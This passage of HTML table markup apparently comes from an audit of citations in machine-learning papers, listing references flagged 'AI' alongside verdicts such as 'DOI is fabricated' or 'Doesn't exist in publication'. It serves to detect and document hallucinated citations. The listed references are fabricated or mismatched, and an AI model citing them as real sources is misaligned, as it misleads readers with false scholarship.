        &lt;p&gt;Ming Zhong, Han Liu, Weizhu Zhang, Houyu Wang, Xiang Li, Maosong Sun, and Xu Han. Hyperbolic and spherical embeddings for long-tail entities. In ACL, pages 5491-5501, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;NUTS: Eddy-Robust Reconstruction of Surface Ocean Nutrients via Two-Scale Modeling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Ye Gao, Robert Tardif, Jiale Cao, and Tapio Schneider. Artificial intelligence reconstructs missing climate information. Nature Geoscience, 17:158-164, 2024. doi: 10.1038/s41561-023-01297-2.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Title and publisher match this article. Issue, page numbers, and year match this article. DOI is fabricated.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;NUTS: Eddy-Robust Reconstruction of Surface Ocean Nutrients via Two-Scale Modeling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Étienne Pardoux and Alexander Yu Veretennikov. Poisson equation for multiscale diffusions. Journal of Mathematical Sciences, 111(3):3713-3719, 2002.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Authors have frequently published together on the "poisson equation", but this title doesn't match any of their publications. Doesn't exist in publication volume/issue.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Test-Time Adaptation of Vision-Language Models for Open-Vocabulary Semantic Segmentation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Charanpal D Mummadi, Matthias Arens, and Thomas Brox. Test-time adaptation for continual semantic segmentation. In Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR), pages 11828-11837, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Test-Time Adaptation of Vision-Language Models for Open-Vocabulary Semantic Segmentation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Jiacheng He, Zhilu Zhang, Zhen Wang, and Yan Huang. Autoencoder based test-time adaptation for semantic segmentation. In Proceedings of the IEEE/CVF International Conference on Computer Vision (ICCV), pages 998-1007, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Global Minimizers of ℓp-Regularized Objectives Yield the Sparsest ReLU Neural Networks&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;M. Gong, F. Yu, J. Zhang, and D. Tao. Efficient $\ell_{p}$ norm regularization for learning sparsity in deep neural networks. IEEE Transactions on Neural Networks and Learning Systems, 33(10): $5381-5392,2022&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;SHAP Meets Tensor Networks: Provably Tractable Explanations with Parallelism&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Mihail Stoian, Richard Milbradt, and Christian Mendl. NP-Hardness of Optimal TensorNetwork Contraction and Polynomial-Time Algorithms for Tree Tensor Networks. Quantum, 6:e119, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;The authors match this article and the title is similar. However, the year, publisher and other data don't match. This article didn't appear in the 2022 Quantum volume.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;SHAP Meets Tensor Networks: Provably Tractable Explanations with Parallelism&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Jianyu Xu, Wei Li, and Ming Zhao. Complexity of Optimal Tensor Network Contraction Sequences. Journal of Computational Physics, 480:112237, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Learning World Models for Interactive Video Generation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Patrick Esser, Robin Rombach, and Björn Ommer. Structure-aware video generation with latent diffusion models. arXiv preprint arXiv:2303.07332, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Authors match this article. ArXiv ID leads to a different article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Fourier Token Merging: Understanding and Capitalizing Frequency Domain for Efficient Image Generation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Lele Xu, Chen Lin, Hongyu Zhao, and et al. Gaborvit: Global attention with local frequency awareness. In European Conference on Computer Vision (ECCV), 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. No match in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Fourier Token Merging: Understanding and Capitalizing Frequency Domain for Efficient Image Generation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yoonwoo Lee, Jaehyeong Kang, Namil Kim, Jinwoo Shin, and Honglak Lee. Structured fast fourier transform attention for vision transformers. In Advances in Neural Information Processing Systems (NeurIPS), 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Fourier Token Merging: Understanding and Capitalizing Frequency Domain for Efficient Image Generation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Siyuan Gong, Alan Yu, Xiaohan Chen, Yinpeng Lin, and Larry S Davis. Vision transformer compression: Early exiting and token pruning. In Advances in Neural Information Processing Systems (NeurIPS), 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. No match in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Fourier Token Merging: Understanding and Capitalizing Frequency Domain for Efficient Image Generation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Jiuxiang Shi, Zuxuan Wu, and Dahua Lin. Token-aware adaptive sampling for efficient diffusion models. In IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR), 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Fourier Token Merging: Understanding and Capitalizing Frequency Domain for Efficient Image Generation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Raphael Muller, Simon Kornblith, and Geoffrey Hinton. Adavit: Adaptive tokens for efficient vision transformer. In Proceedings of the International Conference on Machine Learning (ICML), 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Authors match this article. Title matches this article. No match in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Fourier Token Merging: Understanding and Capitalizing Frequency Domain for Efficient Image Generation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Xin Wang, Anlin Chen, Lihui Xie, Xin Jin, Cheng Wang, and Ping Luo. Not all tokens are equal: Efficient transformer for tokenization and beyond. In Advances in Neural Information Processing Systems (NeurIPS), 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. This article title is similar. No match in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;A Unified Stability Analysis of SAM vs SGD: Role of Data Coherence and Emergence of Simplicity Bias&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
